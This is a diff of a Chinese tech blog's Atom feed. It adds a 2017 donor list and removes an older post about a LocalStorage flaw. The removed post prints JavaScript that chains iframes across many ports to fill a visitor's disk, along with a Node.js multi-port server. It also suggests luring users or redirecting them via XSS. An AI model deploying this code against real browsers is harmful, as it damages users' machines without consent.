@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.flygon.net/"/>
-  <updated>2017-12-09T06:40:35.372Z</updated>
+  <updated>2018-01-02T12:08:29.871Z</updated>
   <id>http://www.flygon.net/</id>
   
   <author>
@@ -14,6 +14,363 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>2017 年捐赠名单</title>
+    <link href="http://www.flygon.net/2017-donors/"/>
+    <id>http://www.flygon.net/2017-donors/</id>
+    <published>2017-12-31T01:57:13.000Z</published>
+    <updated>2018-01-02T12:08:29.871Z</updated>
+    
+    <content type="html">&lt;p&gt;感谢以下童鞋的捐助，你们的慷慨是我继续的动力：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;dornor&lt;/th&gt;
+&lt;th&gt;date&lt;/th&gt;
+&lt;th&gt;value&lt;/th&gt;
+&lt;th&gt;project&lt;/th&gt;
+&lt;th&gt;site&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;*元昊&lt;/td&gt;
+&lt;td&gt;2017.12.14&lt;/td&gt;
+&lt;td&gt;5.00&lt;/td&gt;
+&lt;td&gt;笨办法学 C&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;*斌&lt;/td&gt;
+&lt;td&gt;2017.12.13&lt;/td&gt;
+&lt;td&gt;2.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;*晨&lt;/td&gt;
+&lt;td&gt;2017.11.17&lt;/td&gt;
+&lt;td&gt;6.66&lt;/td&gt;
+&lt;td&gt;笨办法学 C&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;*志红&lt;/td&gt;
+&lt;td&gt;2017.11.12&lt;/td&gt;
+&lt;td&gt;1.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;*启明&lt;/td&gt;
+&lt;td&gt;2017.11.05&lt;/td&gt;
+&lt;td&gt;1.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ApacheCN&lt;/td&gt;
+&lt;td&gt;2017.11.03&lt;/td&gt;
+&lt;td&gt;20.18&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;颉&lt;/td&gt;
+&lt;td&gt;2017.10.31&lt;/td&gt;
+&lt;td&gt;10.00&lt;/td&gt;
+&lt;td&gt;Kali 渗透秘籍&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;*翔鹏&lt;/td&gt;
+&lt;td&gt;2017.10.24&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;99.99&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;桂民&lt;/td&gt;
+&lt;td&gt;2017.10.18&lt;/td&gt;
+&lt;td&gt;10.00&lt;/td&gt;
+&lt;td&gt;笨办法学 C&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;泽宇&lt;/td&gt;
+&lt;td&gt;2017.10.07&lt;/td&gt;
+&lt;td&gt;10.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;快乐心情&lt;/td&gt;
+&lt;td&gt;2017.09.30&lt;/td&gt;
+&lt;td&gt;2.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;虫儿&lt;/td&gt;
+&lt;td&gt;2017.09.27&lt;/td&gt;
+&lt;td&gt;10.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;梦幻之翼&lt;/td&gt;
+&lt;td&gt;2017.09.11&lt;/td&gt;
+&lt;td&gt;1.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;wsh&lt;/td&gt;
+&lt;td&gt;2017.08.31&lt;/td&gt;
+&lt;td&gt;10.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;???&lt;/td&gt;
+&lt;td&gt;2017.08.27&lt;/td&gt;
+&lt;td&gt;19.80&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;知乎&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;五瓶&lt;/td&gt;
+&lt;td&gt;2017.08.23&lt;/td&gt;
+&lt;td&gt;5.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;realX&lt;/td&gt;
+&lt;td&gt;2017.08.22&lt;/td&gt;
+&lt;td&gt;10.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;hdisk0&lt;/td&gt;
+&lt;td&gt;2017.08.21&lt;/td&gt;
+&lt;td&gt;10.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;欧流全&lt;/td&gt;
+&lt;td&gt;2017.08.09&lt;/td&gt;
+&lt;td&gt;5.00&lt;/td&gt;
+&lt;td&gt;笨办法学 Python · 续&lt;/td&gt;
+&lt;td&gt;知乎&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;谁占了我的一年的称号&lt;/td&gt;
+&lt;td&gt;2017.07.25&lt;/td&gt;
+&lt;td&gt;2.00&lt;/td&gt;
+&lt;td&gt;Python 数据科学手册&lt;/td&gt;
+&lt;td&gt;简书&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;海彦&lt;/td&gt;
+&lt;td&gt;2017.07.12&lt;/td&gt;
+&lt;td&gt;10.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;???&lt;/td&gt;
+&lt;td&gt;2017.06.28&lt;/td&gt;
+&lt;td&gt;5.00&lt;/td&gt;
+&lt;td&gt;Linux (x86) Exploit&lt;/td&gt;
+&lt;td&gt;简书&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;xiaojay&lt;/td&gt;
+&lt;td&gt;2017.06.16&lt;/td&gt;
+&lt;td&gt;18.00&lt;/td&gt;
+&lt;td&gt;SICP Py&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;???&lt;/td&gt;
+&lt;td&gt;2017.06.10&lt;/td&gt;
+&lt;td&gt;5.00&lt;/td&gt;
+&lt;td&gt;笨办法学 C&lt;/td&gt;
+&lt;td&gt;看云&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;DoubleMay&lt;/td&gt;
+&lt;td&gt;2017.06.04&lt;/td&gt;
+&lt;td&gt;6.40&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;zkj&lt;/td&gt;
+&lt;td&gt;2017.05.24&lt;/td&gt;
+&lt;td&gt;1.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Madao__&lt;/td&gt;
+&lt;td&gt;2017.05.21&lt;/td&gt;
+&lt;td&gt;5.00&lt;/td&gt;
+&lt;td&gt;笨办法学 C&lt;/td&gt;
+&lt;td&gt;简书&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;糖豆&lt;/td&gt;
+&lt;td&gt;2017.05.21&lt;/td&gt;
+&lt;td&gt;10.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;虎狮豹&lt;/td&gt;
+&lt;td&gt;2017.05.19&lt;/td&gt;
+&lt;td&gt;25.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;V&lt;/td&gt;
+&lt;td&gt;2017.05.16&lt;/td&gt;
+&lt;td&gt;1.70&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;路人甲&lt;/td&gt;
+&lt;td&gt;2017.05.08&lt;/td&gt;
+&lt;td&gt;1.00&lt;/td&gt;
+&lt;td&gt;Kali Linux 网络扫描秘籍&lt;/td&gt;
+&lt;td&gt;码云&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Jedis&lt;/td&gt;
+&lt;td&gt;2017.05.02&lt;/td&gt;
+&lt;td&gt;5.00&lt;/td&gt;
+&lt;td&gt;Pandas 秘籍&lt;/td&gt;
+&lt;td&gt;简书&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;多明戈多明戈&lt;/td&gt;
+&lt;td&gt;2017.04.26&lt;/td&gt;
+&lt;td&gt;5.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Thinker&lt;/td&gt;
+&lt;td&gt;2017.04.16&lt;/td&gt;
+&lt;td&gt;4.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;龙兄&lt;/td&gt;
+&lt;td&gt;2017.04.03&lt;/td&gt;
+&lt;td&gt;3.00&lt;/td&gt;
+&lt;td&gt;操作系统思考&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;惊红公子&lt;/td&gt;
+&lt;td&gt;2017.03.30&lt;/td&gt;
+&lt;td&gt;10.00&lt;/td&gt;
+&lt;td&gt;C++ 参考&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;橙畜畜&lt;/td&gt;
+&lt;td&gt;2017.03.27&lt;/td&gt;
+&lt;td&gt;50.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;sufooo&lt;/td&gt;
+&lt;td&gt;2017.03.27&lt;/td&gt;
+&lt;td&gt;10.00&lt;/td&gt;
+&lt;td&gt;Kali Linux 无线渗透测试入门指南&lt;/td&gt;
+&lt;td&gt;码云&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;梦醒何时尔&lt;/td&gt;
+&lt;td&gt;2017.03.10&lt;/td&gt;
+&lt;td&gt;30.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;向小路&lt;/td&gt;
+&lt;td&gt;2017.02.21&lt;/td&gt;
+&lt;td&gt;3.30&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;喆&lt;/td&gt;
+&lt;td&gt;2017.02.11&lt;/td&gt;
+&lt;td&gt;6.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;佳琳&lt;/td&gt;
+&lt;td&gt;2017.01.18&lt;/td&gt;
+&lt;td&gt;5.55&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;少高&lt;/td&gt;
+&lt;td&gt;2017.01.11&lt;/td&gt;
+&lt;td&gt;6.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;vose&lt;/td&gt;
+&lt;td&gt;2017.01.06&lt;/td&gt;
+&lt;td&gt;5.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;李小双&lt;/td&gt;
+&lt;td&gt;2017.01.04&lt;/td&gt;
+&lt;td&gt;5.00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;支付宝&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;感谢以下童鞋的捐助，你们的慷慨是我继续的动力：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;dornor&lt;/th&gt;
+&lt;th&gt;date&lt;/th&gt;
+&lt;th&gt;value&lt;/th&gt;
+&lt;th&gt;project&lt;/th&gt;
+&lt;th&gt;site&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thea
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>CSDN 重复文件上传限制的解决办法</title>
@@ -835,49 +1192,6 @@
     
     
       <category term="cpp" scheme="http://www.flygon.net/tags/cpp/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>LocalStorage 的一个漏洞</title>
-    <link href="http://www.flygon.net/LocalStorage-%E7%9A%84%E4%B8%80%E4%B8%AA%E6%BC%8F%E6%B4%9E/"/>
-    <id>http://www.flygon.net/LocalStorage-的一个漏洞/</id>
-    <published>2016-02-07T13:12:04.000Z</published>
-    <updated>2016-03-03T07:17:17.427Z</updated>
-    
-    <content type="html">&lt;p&gt;LocalStorage 是 html5 的本地存储，其中的内容以文件的形式保存在本地磁盘中。&lt;/p&gt;
-&lt;p&gt;一个域（协议+域名+端口）的文件大小PC端为5~10M，移动端不大于2.5M。&lt;/p&gt;
-&lt;p&gt;但是我们可以在端口上做点手脚，因为端口是可控的，我们可以开一个服务器监听很多个端口，然后输出的页面使用iframe进行递归包含。&lt;/p&gt;
-&lt;p&gt;比如我们的页面可以嵌入以下代码：&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(function()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var maxPort = ...;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    // 写文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var s = &amp;quot;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    for(var i=0; i&amp;lt; 3 * 1024 * 1024; i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        s += &amp;quot;0&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    localStorage.setItem(&amp;apos;k&amp;apos;, s);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var port = parseInt(location.port) + 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if(port &amp;gt; maxPort) return;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if(port % 50 == 0)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        //每50个重定向一次，防止崩溃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        window.location.href = url;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        // 新添加iframe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        var url = &amp;quot;http://example.com:&amp;quot; + port;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        var $iframe = document.createElement(&amp;quot;iframe&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $iframe.src = url;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        document.getElementsByTagName(&amp;quot;body&amp;quot;)[0].appendChild($iframe);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;之后我们用Node.js架设服务器：&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var http = require(&amp;apos;http&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var fs = require(&amp;apos;fs&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var content = fs.readFileSync(&amp;apos;./index.html&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var maxPort = ...;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;for(var port = 1000; port &amp;lt; maxPort; port++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    http.createServer(function (request, response) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        response.writeHead(200, &amp;#123; &amp;apos;Content-Type&amp;apos; : &amp;apos;text/html; charset=UTF-8&amp;apos; &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        response.write(content);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        response.end();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;).listen(port);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;我们可以给页面加点装饰，诱导用户点击。也可以使用现有的XSS漏洞重定向过去。&lt;/p&gt;
-&lt;p&gt;测试结果&lt;/p&gt;
-&lt;p&gt;100个端口有几乎500MB&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://litten.github.io/assets/blogImg/localstorage3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;200个端口则有1.17个G&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://litten.github.io/assets/blogImg/localstorage4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;如果将端口调整至2000个&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://litten.github.io/assets/blogImg/localstorage5.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;GG。&lt;/p&gt;
-&lt;p&gt;注&lt;/p&gt;
-&lt;p&gt;来源：&lt;a href=&quot;http://litten.github.io/2015/07/06/hack-in-localstorage/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;作为一个前端，可以如何机智地弄坏一台电脑？&lt;/a&gt;&lt;/p&gt;
-</content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;LocalStorage 是 html5 的本地存储，其中的内容以文件的形式保存在本地磁盘中。&lt;/p&gt;
-&lt;p&gt;一个域（协议+域名+端口）的文件大小PC端为5~10M，移动端不大于2.5M。&lt;/p&gt;
-&lt;p&gt;但是我们可以在端口上做点手脚，因为端口是可控的，我们可以开一个服务器监听很多个端口，然后输出的页面使用iframe进行递归包含。&lt;/p&gt;
-&lt;p&gt;比如我们的页面可以嵌入以下代码：
-    
-    </summary>
-    
-      <category term="安全" scheme="http://www.flygon.net/categories/%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="html5" scheme="http://www.flygon.net/tags/html5/"/>
     
   </entry>
   
